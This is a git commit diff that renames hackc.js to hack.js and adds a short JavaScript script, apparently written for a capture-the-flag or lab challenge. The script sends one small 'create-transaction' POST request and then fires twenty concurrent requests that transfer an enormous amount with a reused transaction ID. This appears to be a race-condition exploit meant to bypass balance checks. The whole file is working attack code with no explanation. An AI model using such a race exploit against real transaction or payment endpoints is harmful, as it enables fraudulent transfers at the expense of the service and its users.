71769b98a30220330549bb8c8d5e242ca1f407a8
Achuth V P <65720815+retrymp3@users.noreply.github.com>
2025-05-20 00:03:25 +0530

    Update and rename hackc.js to hack.js

---
+++ hack.js
@@ -0,0 +1,16 @@
+(async () => {
+    await fetch('/?action=create-transaction', {
+      method: 'POST',
+      body: 'recipient=birdbirdbird&amount=1',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+    });
+  
+    for (let i = 0; i < 20; i++) {
+      fetch('/?action=create-transaction', {
+        method: 'POST',
+        body: 'recipient=birdbirdbird&amount=999999999999&transaction_id=1',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      });
+    }
+  })();
+  
--- hackc.js
+++
@@ -1,5 +0,0 @@
-fetch('/?action=create-transaction', {
-    method:'POST', 
-    body:'recipient=birdbirdbird&amount=1', 
-    headers:{'Content-Type':'application/x-www-form-urlencoded'}
-  });
